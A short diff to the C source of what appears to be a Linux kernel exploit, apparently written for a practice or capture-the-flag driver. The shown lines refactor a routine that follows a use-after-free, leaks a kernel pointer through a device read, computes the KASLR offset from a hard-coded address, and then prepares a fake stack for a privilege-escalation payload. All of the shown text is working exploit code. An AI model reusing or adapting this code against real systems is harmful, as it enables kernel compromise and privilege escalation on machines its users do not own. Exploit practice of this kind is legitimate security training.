@@ -202,11 +202,12 @@ err:
 	}
 }
 
-static void leak_offset_and_g_buf(int fd, uint8_t *data)
+static void leak_offset_and_g_buf(void)
 {
+	uint8_t data[0x40];
 	uintptr_t ptr;
 
-	read(fd, data, 0x40);
+	read(fd1, data, 0x40);
 	ptr = *(uintptr_t *)&data[0x18];
 	offset = ptr - 0xffffffff81c3afe0;
 	printf("[+] offset %p\n", offset);
@@ -223,7 +224,7 @@ int main(void)
 	save_state();
 
 	uaf();
-	leak_offset_and_g_buf(fd1, data);
+	leak_offset_and_g_buf();
 
 	read(fd1, data, 0x400);
 	stack = (uintptr_t *)data;
